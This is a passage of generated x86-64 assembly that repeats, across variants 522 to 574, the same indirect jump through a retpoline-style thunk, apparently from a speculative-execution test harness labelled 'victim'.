	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000522
	jmp	.Lgg_retpol_after_000522
.Lgg_retpol_thunk_000522:
	callq	.Lgg_retpol_setup_000522
.Lgg_retpol_cap_000522:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000522
.Lgg_retpol_setup_000522:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000522:
	jmp	.Lvictim_win0_continue
## Variant 523
.Lvictim_win0_var523:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000523
	jmp	.Lgg_retpol_after_000523
.Lgg_retpol_thunk_000523:
	callq	.Lgg_retpol_setup_000523
.Lgg_retpol_cap_000523:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000523
.Lgg_retpol_setup_000523:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000523:
	jmp	.Lvictim_win0_continue
## Variant 524
.Lvictim_win0_var524:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000524
	jmp	.Lgg_retpol_after_000524
.Lgg_retpol_thunk_000524:
	callq	.Lgg_retpol_setup_000524
.Lgg_retpol_cap_000524:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000524
.Lgg_retpol_setup_000524:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000524:
	jmp	.Lvictim_win0_continue
## Variant 525
.Lvictim_win0_var525:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000525
	jmp	.Lgg_retpol_after_000525
.Lgg_retpol_thunk_000525:
	callq	.Lgg_retpol_setup_000525
.Lgg_retpol_cap_000525:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000525
.Lgg_retpol_setup_000525:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000525:
	jmp	.Lvictim_win0_continue
## Variant 526
.Lvictim_win0_var526:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000526
	jmp	.Lgg_retpol_after_000526
.Lgg_retpol_thunk_000526:
	callq	.Lgg_retpol_setup_000526
.Lgg_retpol_cap_000526:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000526
.Lgg_retpol_setup_000526:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000526:
	jmp	.Lvictim_win0_continue
## Variant 527
.Lvictim_win0_var527:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000527
	jmp	.Lgg_retpol_after_000527
.Lgg_retpol_thunk_000527:
	callq	.Lgg_retpol_setup_000527
.Lgg_retpol_cap_000527:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000527
.Lgg_retpol_setup_000527:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000527:
	jmp	.Lvictim_win0_continue
## Variant 528
.Lvictim_win0_var528:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000528
	jmp	.Lgg_retpol_after_000528
.Lgg_retpol_thunk_000528:
	callq	.Lgg_retpol_setup_000528
.Lgg_retpol_cap_000528:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000528
.Lgg_retpol_setup_000528:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000528:
	jmp	.Lvictim_win0_continue
## Variant 529
.Lvictim_win0_var529:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000529
	jmp	.Lgg_retpol_after_000529
.Lgg_retpol_thunk_000529:
	callq	.Lgg_retpol_setup_000529
.Lgg_retpol_cap_000529:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000529
.Lgg_retpol_setup_000529:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000529:
	jmp	.Lvictim_win0_continue
## Variant 530
.Lvictim_win0_var530:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000530
	jmp	.Lgg_retpol_after_000530
.Lgg_retpol_thunk_000530:
	callq	.Lgg_retpol_setup_000530
.Lgg_retpol_cap_000530:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000530
.Lgg_retpol_setup_000530:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000530:
	jmp	.Lvictim_win0_continue
## Variant 531
.Lvictim_win0_var531:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000531
	jmp	.Lgg_retpol_after_000531
.Lgg_retpol_thunk_000531:
	callq	.Lgg_retpol_setup_000531
.Lgg_retpol_cap_000531:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000531
.Lgg_retpol_setup_000531:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000531:
	jmp	.Lvictim_win0_continue
## Variant 532
.Lvictim_win0_var532:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000532
	jmp	.Lgg_retpol_after_000532
.Lgg_retpol_thunk_000532:
	callq	.Lgg_retpol_setup_000532
.Lgg_retpol_cap_000532:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000532
.Lgg_retpol_setup_000532:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000532:
	jmp	.Lvictim_win0_continue
## Variant 533
.Lvictim_win0_var533:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000533
	jmp	.Lgg_retpol_after_000533
.Lgg_retpol_thunk_000533:
	callq	.Lgg_retpol_setup_000533
.Lgg_retpol_cap_000533:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000533
.Lgg_retpol_setup_000533:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000533:
	jmp	.Lvictim_win0_continue
## Variant 534
.Lvictim_win0_var534:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000534
	jmp	.Lgg_retpol_after_000534
.Lgg_retpol_thunk_000534:
	callq	.Lgg_retpol_setup_000534
.Lgg_retpol_cap_000534:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000534
.Lgg_retpol_setup_000534:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000534:
	jmp	.Lvictim_win0_continue
## Variant 535
.Lvictim_win0_var535:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000535
	jmp	.Lgg_retpol_after_000535
.Lgg_retpol_thunk_000535:
	callq	.Lgg_retpol_setup_000535
.Lgg_retpol_cap_000535:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000535
.Lgg_retpol_setup_000535:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000535:
	jmp	.Lvictim_win0_continue
## Variant 536
.Lvictim_win0_var536:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000536
	jmp	.Lgg_retpol_after_000536
.Lgg_retpol_thunk_000536:
	callq	.Lgg_retpol_setup_000536
.Lgg_retpol_cap_000536:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000536
.Lgg_retpol_setup_000536:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000536:
	jmp	.Lvictim_win0_continue
## Variant 537
.Lvictim_win0_var537:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000537
	jmp	.Lgg_retpol_after_000537
.Lgg_retpol_thunk_000537:
	callq	.Lgg_retpol_setup_000537
.Lgg_retpol_cap_000537:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000537
.Lgg_retpol_setup_000537:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000537:
	jmp	.Lvictim_win0_continue
## Variant 538
.Lvictim_win0_var538:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000538
	jmp	.Lgg_retpol_after_000538
.Lgg_retpol_thunk_000538:
	callq	.Lgg_retpol_setup_000538
.Lgg_retpol_cap_000538:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000538
.Lgg_retpol_setup_000538:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000538:
	jmp	.Lvictim_win0_continue
## Variant 539
.Lvictim_win0_var539:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000539
	jmp	.Lgg_retpol_after_000539
.Lgg_retpol_thunk_000539:
	callq	.Lgg_retpol_setup_000539
.Lgg_retpol_cap_000539:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000539
.Lgg_retpol_setup_000539:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000539:
	jmp	.Lvictim_win0_continue
## Variant 540
.Lvictim_win0_var540:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000540
	jmp	.Lgg_retpol_after_000540
.Lgg_retpol_thunk_000540:
	callq	.Lgg_retpol_setup_000540
.Lgg_retpol_cap_000540:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000540
.Lgg_retpol_setup_000540:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000540:
	jmp	.Lvictim_win0_continue
## Variant 541
.Lvictim_win0_var541:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000541
	jmp	.Lgg_retpol_after_000541
.Lgg_retpol_thunk_000541:
	callq	.Lgg_retpol_setup_000541
.Lgg_retpol_cap_000541:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000541
.Lgg_retpol_setup_000541:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000541:
	jmp	.Lvictim_win0_continue
## Variant 542
.Lvictim_win0_var542:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000542
	jmp	.Lgg_retpol_after_000542
.Lgg_retpol_thunk_000542:
	callq	.Lgg_retpol_setup_000542
.Lgg_retpol_cap_000542:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000542
.Lgg_retpol_setup_000542:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000542:
	jmp	.Lvictim_win0_continue
## Variant 543
.Lvictim_win0_var543:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000543
	jmp	.Lgg_retpol_after_000543
.Lgg_retpol_thunk_000543:
	callq	.Lgg_retpol_setup_000543
.Lgg_retpol_cap_000543:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000543
.Lgg_retpol_setup_000543:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000543:
	jmp	.Lvictim_win0_continue
## Variant 544
.Lvictim_win0_var544:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000544
	jmp	.Lgg_retpol_after_000544
.Lgg_retpol_thunk_000544:
	callq	.Lgg_retpol_setup_000544
.Lgg_retpol_cap_000544:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000544
.Lgg_retpol_setup_000544:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000544:
	jmp	.Lvictim_win0_continue
## Variant 545
.Lvictim_win0_var545:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000545
	jmp	.Lgg_retpol_after_000545
.Lgg_retpol_thunk_000545:
	callq	.Lgg_retpol_setup_000545
.Lgg_retpol_cap_000545:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000545
.Lgg_retpol_setup_000545:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000545:
	jmp	.Lvictim_win0_continue
## Variant 546
.Lvictim_win0_var546:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000546
	jmp	.Lgg_retpol_after_000546
.Lgg_retpol_thunk_000546:
	callq	.Lgg_retpol_setup_000546
.Lgg_retpol_cap_000546:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000546
.Lgg_retpol_setup_000546:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000546:
	jmp	.Lvictim_win0_continue
## Variant 547
.Lvictim_win0_var547:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000547
	jmp	.Lgg_retpol_after_000547
.Lgg_retpol_thunk_000547:
	callq	.Lgg_retpol_setup_000547
.Lgg_retpol_cap_000547:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000547
.Lgg_retpol_setup_000547:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000547:
	jmp	.Lvictim_win0_continue
## Variant 548
.Lvictim_win0_var548:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000548
	jmp	.Lgg_retpol_after_000548
.Lgg_retpol_thunk_000548:
	callq	.Lgg_retpol_setup_000548
.Lgg_retpol_cap_000548:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000548
.Lgg_retpol_setup_000548:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000548:
	jmp	.Lvictim_win0_continue
## Variant 549
.Lvictim_win0_var549:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000549
	jmp	.Lgg_retpol_after_000549
.Lgg_retpol_thunk_000549:
	callq	.Lgg_retpol_setup_000549
.Lgg_retpol_cap_000549:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000549
.Lgg_retpol_setup_000549:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000549:
	jmp	.Lvictim_win0_continue
## Variant 550
.Lvictim_win0_var550:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000550
	jmp	.Lgg_retpol_after_000550
.Lgg_retpol_thunk_000550:
	callq	.Lgg_retpol_setup_000550
.Lgg_retpol_cap_000550:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000550
.Lgg_retpol_setup_000550:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000550:
	jmp	.Lvictim_win0_continue
## Variant 551
.Lvictim_win0_var551:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000551
	jmp	.Lgg_retpol_after_000551
.Lgg_retpol_thunk_000551:
	callq	.Lgg_retpol_setup_000551
.Lgg_retpol_cap_000551:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000551
.Lgg_retpol_setup_000551:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000551:
	jmp	.Lvictim_win0_continue
## Variant 552
.Lvictim_win0_var552:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000552
	jmp	.Lgg_retpol_after_000552
.Lgg_retpol_thunk_000552:
	callq	.Lgg_retpol_setup_000552
.Lgg_retpol_cap_000552:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000552
.Lgg_retpol_setup_000552:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000552:
	jmp	.Lvictim_win0_continue
## Variant 553
.Lvictim_win0_var553:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000553
	jmp	.Lgg_retpol_after_000553
.Lgg_retpol_thunk_000553:
	callq	.Lgg_retpol_setup_000553
.Lgg_retpol_cap_000553:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000553
.Lgg_retpol_setup_000553:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000553:
	jmp	.Lvictim_win0_continue
## Variant 554
.Lvictim_win0_var554:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000554
	jmp	.Lgg_retpol_after_000554
.Lgg_retpol_thunk_000554:
	callq	.Lgg_retpol_setup_000554
.Lgg_retpol_cap_000554:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000554
.Lgg_retpol_setup_000554:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000554:
	jmp	.Lvictim_win0_continue
## Variant 555
.Lvictim_win0_var555:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000555
	jmp	.Lgg_retpol_after_000555
.Lgg_retpol_thunk_000555:
	callq	.Lgg_retpol_setup_000555
.Lgg_retpol_cap_000555:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000555
.Lgg_retpol_setup_000555:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000555:
	jmp	.Lvictim_win0_continue
## Variant 556
.Lvictim_win0_var556:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000556
	jmp	.Lgg_retpol_after_000556
.Lgg_retpol_thunk_000556:
	callq	.Lgg_retpol_setup_000556
.Lgg_retpol_cap_000556:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000556
.Lgg_retpol_setup_000556:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000556:
	jmp	.Lvictim_win0_continue
## Variant 557
.Lvictim_win0_var557:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000557
	jmp	.Lgg_retpol_after_000557
.Lgg_retpol_thunk_000557:
	callq	.Lgg_retpol_setup_000557
.Lgg_retpol_cap_000557:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000557
.Lgg_retpol_setup_000557:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000557:
	jmp	.Lvictim_win0_continue
## Variant 558
.Lvictim_win0_var558:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000558
	jmp	.Lgg_retpol_after_000558
.Lgg_retpol_thunk_000558:
	callq	.Lgg_retpol_setup_000558
.Lgg_retpol_cap_000558:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000558
.Lgg_retpol_setup_000558:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000558:
	jmp	.Lvictim_win0_continue
## Variant 559
.Lvictim_win0_var559:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000559
	jmp	.Lgg_retpol_after_000559
.Lgg_retpol_thunk_000559:
	callq	.Lgg_retpol_setup_000559
.Lgg_retpol_cap_000559:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000559
.Lgg_retpol_setup_000559:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000559:
	jmp	.Lvictim_win0_continue
## Variant 560
.Lvictim_win0_var560:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000560
	jmp	.Lgg_retpol_after_000560
.Lgg_retpol_thunk_000560:
	callq	.Lgg_retpol_setup_000560
.Lgg_retpol_cap_000560:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000560
.Lgg_retpol_setup_000560:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000560:
	jmp	.Lvictim_win0_continue
## Variant 561
.Lvictim_win0_var561:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000561
	jmp	.Lgg_retpol_after_000561
.Lgg_retpol_thunk_000561:
	callq	.Lgg_retpol_setup_000561
.Lgg_retpol_cap_000561:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000561
.Lgg_retpol_setup_000561:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000561:
	jmp	.Lvictim_win0_continue
## Variant 562
.Lvictim_win0_var562:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000562
	jmp	.Lgg_retpol_after_000562
.Lgg_retpol_thunk_000562:
	callq	.Lgg_retpol_setup_000562
.Lgg_retpol_cap_000562:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000562
.Lgg_retpol_setup_000562:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000562:
	jmp	.Lvictim_win0_continue
## Variant 563
.Lvictim_win0_var563:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000563
	jmp	.Lgg_retpol_after_000563
.Lgg_retpol_thunk_000563:
	callq	.Lgg_retpol_setup_000563
.Lgg_retpol_cap_000563:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000563
.Lgg_retpol_setup_000563:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000563:
	jmp	.Lvictim_win0_continue
## Variant 564
.Lvictim_win0_var564:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000564
	jmp	.Lgg_retpol_after_000564
.Lgg_retpol_thunk_000564:
	callq	.Lgg_retpol_setup_000564
.Lgg_retpol_cap_000564:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000564
.Lgg_retpol_setup_000564:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000564:
	jmp	.Lvictim_win0_continue
## Variant 565
.Lvictim_win0_var565:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000565
	jmp	.Lgg_retpol_after_000565
.Lgg_retpol_thunk_000565:
	callq	.Lgg_retpol_setup_000565
.Lgg_retpol_cap_000565:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000565
.Lgg_retpol_setup_000565:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000565:
	jmp	.Lvictim_win0_continue
## Variant 566
.Lvictim_win0_var566:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000566
	jmp	.Lgg_retpol_after_000566
.Lgg_retpol_thunk_000566:
	callq	.Lgg_retpol_setup_000566
.Lgg_retpol_cap_000566:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000566
.Lgg_retpol_setup_000566:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000566:
	jmp	.Lvictim_win0_continue
## Variant 567
.Lvictim_win0_var567:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000567
	jmp	.Lgg_retpol_after_000567
.Lgg_retpol_thunk_000567:
	callq	.Lgg_retpol_setup_000567
.Lgg_retpol_cap_000567:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000567
.Lgg_retpol_setup_000567:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000567:
	jmp	.Lvictim_win0_continue
## Variant 568
.Lvictim_win0_var568:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000568
	jmp	.Lgg_retpol_after_000568
.Lgg_retpol_thunk_000568:
	callq	.Lgg_retpol_setup_000568
.Lgg_retpol_cap_000568:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000568
.Lgg_retpol_setup_000568:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000568:
	jmp	.Lvictim_win0_continue
## Variant 569
.Lvictim_win0_var569:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000569
	jmp	.Lgg_retpol_after_000569
.Lgg_retpol_thunk_000569:
	callq	.Lgg_retpol_setup_000569
.Lgg_retpol_cap_000569:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000569
.Lgg_retpol_setup_000569:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000569:
	jmp	.Lvictim_win0_continue
## Variant 570
.Lvictim_win0_var570:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000570
	jmp	.Lgg_retpol_after_000570
.Lgg_retpol_thunk_000570:
	callq	.Lgg_retpol_setup_000570
.Lgg_retpol_cap_000570:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000570
.Lgg_retpol_setup_000570:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000570:
	jmp	.Lvictim_win0_continue
## Variant 571
.Lvictim_win0_var571:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000571
	jmp	.Lgg_retpol_after_000571
.Lgg_retpol_thunk_000571:
	callq	.Lgg_retpol_setup_000571
.Lgg_retpol_cap_000571:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000571
.Lgg_retpol_setup_000571:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000571:
	jmp	.Lvictim_win0_continue
## Variant 572
.Lvictim_win0_var572:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000572
	jmp	.Lgg_retpol_after_000572
.Lgg_retpol_thunk_000572:
	callq	.Lgg_retpol_setup_000572
.Lgg_retpol_cap_000572:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000572
.Lgg_retpol_setup_000572:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000572:
	jmp	.Lvictim_win0_continue
## Variant 573
.Lvictim_win0_var573:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000573
	jmp	.Lgg_retpol_after_000573
.Lgg_retpol_thunk_000573:
	callq	.Lgg_retpol_setup_000573
.Lgg_retpol_cap_000573:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000573
.Lgg_retpol_setup_000573:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000573:
	jmp	.Lvictim_win0_continue
## Variant 574
.Lvictim_win0_var574:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000574
